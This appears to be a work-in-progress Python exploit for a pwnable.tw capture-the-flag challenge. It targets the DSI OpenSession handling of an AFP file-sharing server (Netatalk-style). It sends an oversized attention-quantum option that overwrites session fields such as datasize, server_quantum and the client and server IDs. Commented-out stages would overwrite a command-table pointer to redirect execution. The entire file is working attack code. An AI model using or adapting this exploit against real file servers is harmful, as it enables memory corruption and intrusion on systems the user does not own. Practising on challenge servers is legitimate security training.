import socket
import struct
import sys
import pwn
if len(sys.argv) != 3:
    print("no arguments!")
    sys.exit(0)
ip = sys.argv[1]
port = int(sys.argv[2])


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

### pwnable.tw 
###     python exploit.py 139.162.123.119 10002
print("[+] Attempting connection to " + ip + ":" + sys.argv[2])
sock.connect((ip, port))

def stage1():
    dsi_opensession = b"\x01" # attention quantum option
    dsi_opensession += b"\x04" # length
    dsi_opensession += b"\x00\x00\x40\x00" # client quantum
    return dsi_opensession

def stage2():
    dsi_opensession = b"\x01" # attention quantum option
    dsi_opensession += b"\x10" # length (/)o,,o(/)
    dsi_opensession += b"\x00\x00\x40\x00" # client quantum
    dsi_opensession += b'\x00\x00\x00\x00' # overwrites datasize
    dsi_opensession += struct.pack("I", 0xdeadbeef) # overwrites server_quantum
    dsi_opensession += struct.pack("I", 0xfaceb00c) # overwrites the ids
    return dsi_opensession

def stage3():
    dsi_payload = b"\x00\x00\x40\x00" # client quantum
    dsi_payload += b'\x00\x00\x00\x00' # overwrites datasize
    dsi_payload += struct.pack("I", 0xdeadbeef) # overwrites server_quantum
    dsi_payload += struct.pack("I", 0xfaceb00c) # overwrites serverID and clientID
    # dsi_payload += struct.pack("Q", 0x244A20) # overwrite commands ptr (origin: 0x63b660)
    dsi_opensession = b"\x01" # attention quantum option
    print(dsi_payload)
    print(hex(len(dsi_payload)))
    dsi_opensession += struct.pack("B", len(dsi_payload)) # length
    dsi_opensession += dsi_payload
    return dsi_opensession

# 0x2D2F0: addr of afp_getsrvrinfo
def dsiOpenSession(dsi_opensession):
    dsi_header = b"\x00" # "request" flag
    dsi_header += b"\x04" # open session command
    dsi_header += b"\x00\x01" # request id
    dsi_header += b"\x00\x00\x00\x00" # data offset
    dsi_header += struct.pack(">I", len(dsi_opensession))
    dsi_header += b"\x00\x00\x00\x00" # reserved
    dsi_header += dsi_opensession
    sock.sendall(dsi_header)
    try:
        resp = sock.recv(1024)
        print(resp)
        print("[+] Open session complete.")
    except:
        print("[-] Open session fail!")

# def dsiCommand():
#     afp_command = "\x01" # invoke the second entry in the table
#     afp_command += "\x00" # protocol defined padding
#     afp_command += "\x00\x00\x00\x00\x00\x00" # pad out the first entry
#     afp_command += struct.pack("Q", 0x2D2F0) # address to jump to (origin: 0x4295f0)
    
#     dsi_header = "\x00" # "request" flag
#     dsi_header += "\x02" # "AFP" command
#     dsi_header += "\x00\x02" # request id
#     dsi_header += "\x00\x00\x00\x00" # data offset
#     dsi_header += struct.pack(">I", len(afp_command))
#     dsi_header += '\x00\x00\x00\x00' # reserved
#     dsi_header += afp_command
#     sock.sendall(dsi_header) 
#     print "[+] Sending get server info request"
#     try:
#         resp = sock.recv(1024)
#         print resp
#         print "[+] Get server info complete."
#     except:
#         print "[-] Get server info fail!"


def main():
    # dsi_opensession = stage1()
    dsi_opensession = stage2()
    # dsi_opensession = stage3()

    dsiOpenSession(dsi_opensession)
    # dsiCommand()

main()